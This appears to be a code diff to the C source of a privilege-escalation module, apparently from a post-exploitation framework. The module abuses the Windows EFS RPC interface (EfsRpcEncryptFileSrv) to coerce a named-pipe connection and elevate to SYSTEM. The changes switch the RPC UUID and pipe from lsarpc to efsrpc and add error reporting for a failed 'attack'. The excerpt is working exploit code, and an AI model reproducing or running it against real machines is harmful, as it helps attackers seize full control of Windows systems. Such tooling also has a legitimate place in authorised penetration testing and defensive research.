@@ -9,8 +9,8 @@ RPC_STATUS EfsRpcEncryptFileSrv(handle_t binding_h, wchar_t* FileName);
 DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName);
 handle_t efs_bind(wchar_t* target);
 
-const RPC_WSTR MS_EFSR_UUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
-const RPC_WSTR LSARPC_NAMEDPIPE = (RPC_WSTR)L"\\pipe\\lsarpc";
+const RPC_WSTR MS_EFSR_UUID = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";
+const RPC_WSTR EFSRPC_NAMEDPIPE = (RPC_WSTR)L"\\pipe\\efsrpc";
 
 DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 {
@@ -137,6 +137,7 @@ DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 		if (hr == ERROR_BAD_NETPATH) {
 			dprintf("[ELEVATE] trigger_efs_connection: Success");
 		} else {
+			dwResult = hr;
 			dprintf("[ELEVATE] trigger_efs_connection: Did not receive expected output. Attack might have failed.");
 		}
 
@@ -177,7 +178,7 @@ handle_t efs_bind(wchar_t* target)
 		MS_EFSR_UUID,
 		(RPC_WSTR)L"ncacn_np",
 		(RPC_WSTR)buffer,
-		LSARPC_NAMEDPIPE,
+		EFSRPC_NAMEDPIPE,
 		NULL,
 		&StringBinding);
 	CHECK_RPC_STATUS_AND_RETURN("RpcStringBindingComposeW", RpcStatus);
